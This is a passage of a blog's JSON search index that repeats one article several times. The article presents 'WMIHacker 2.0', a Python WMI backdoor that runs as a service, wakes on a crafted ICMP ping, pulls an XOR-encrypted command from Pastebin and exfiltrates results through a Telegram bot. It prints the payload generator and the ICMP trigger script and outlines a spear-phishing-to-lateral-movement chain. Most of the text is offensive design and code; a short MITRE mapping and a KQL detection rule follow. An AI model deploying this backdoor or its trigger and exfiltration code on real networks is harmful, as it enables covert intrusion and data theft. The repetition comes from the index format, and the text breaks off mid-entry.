Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT\u0026amp;CK map The table below maps key attacker actions to MITRE ATT\u0026amp;CK techniques. It shows how the backdoor achieves things like initial access, execution, C2, and evasionâ€”using WMI, ICMP, Telegram, and more. This gives a clear view of the TTPs involved and helps defenders understand what to watch for.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Application Layer Protocol: ICMP T1043 Use of ICMP for signaling Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT\u0026amp;CK map The table below maps key attacker actions to MITRE ATT\u0026amp;CK techniques. It shows how the backdoor achieves things like initial access, execution, C2, and evasionâ€”using WMI, ICMP, Telegram, and more. This gives a clear view of the TTPs involved and helps defenders understand what to watch for.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Application Layer Protocol: ICMP T1043 Use of ICMP for signaling Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT\u0026amp;CK mapping The table below maps key attacker actions to MITRE ATT\u0026amp;CK techniques. It shows how the backdoor achieves things like initial access, execution, C2, and evasionâ€”using WMI, ICMP, Telegram, and more. This gives a clear view of the TTPs involved and helps defenders understand what to watch for.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Application Layer Protocol: ICMP T1043 Use of ICMP for signaling Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; 